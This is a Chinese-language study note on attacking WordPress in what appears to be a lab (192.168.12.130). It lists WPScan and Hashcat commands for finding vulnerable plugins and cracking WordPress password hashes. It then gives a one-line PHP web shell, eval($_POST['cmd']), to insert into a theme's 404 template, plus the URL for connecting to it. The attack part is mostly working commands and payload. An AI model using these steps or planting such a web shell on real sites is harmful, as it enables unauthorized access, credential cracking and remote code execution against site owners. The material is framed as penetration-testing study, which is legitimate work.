# 记WordPress渗透学习

## 前言
WordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把WordPress当作一个内容管理系统（CMS）来使用。WordPress是一款个人博客系统，并逐步演化成一款内容管理系统软件，它是使用PHP语言和MySQL数据库开发的，用户可以在支持PHP和MySQL数据库的服务器上使用自己的博客。WordPress有许多第三方开发的免费模板，安装方式简单易用。不过要做一个自己的模板，则需要你有一定的专业知识。比如你至少要懂的标准通用标记语言下的一个应用HTML代码、CSS、PHP等相关知识。

## 攻击工具
- *__WPScan__* 是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。
- *__Hashcat__* 是自称世界上最快的密码恢复工具。它在2015年之前拥有专有代码库，但现在作为免费软件发布。适用于Linux，OS X和Windows的版本可以使用基于CPU或基于GPU的变体。支持hashcat的散列算法有Microsoft LM哈希，MD4，MD5，SHA系列，Unix加密格式，MySQL和Cisco PIX等。
- *__中国蚁剑__* AntSword是一款开源的跨平台网站管理工具，核心代码模板均改自伟大的中国菜刀，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。


## WPscan
查看目标网站是否有插件存在漏洞，例子如下
```
wpscan --url "http://192.168.12.130" --enumerate p --force --wp-content-dir=wp-content
```
正常来说是不需要–force --wp-content-dir=wp-content这些参数的，但是可能由于目标机器的wordpress版本有些低，所以wpscan无法识别到目标网站是wordpress，所以加上后面的这些参数。

## hashcat
hashcat需要加两个参数，-a和-m，其中-a是爆破模式，-m是哈希类型
```
hashcat -a 0 -m 400 /root/hash.txt /root/pass.txt
```
目标用户密码的hash值保存到文件名为/root/hash.txt中，密码字典使用/root/pass.txt，wordpress的哈希类型是400。

## 利用WordPress后台获取Webshell
```外观``` -> ```编辑``` -> ``` 404模板 ``` \
在php代码中写上一句话木马：
```text
eval($_POST['cmd']);
```
连接Shell的地址:```http://192.168.12.130/wp-content/themes/twentysixteen/404.php```











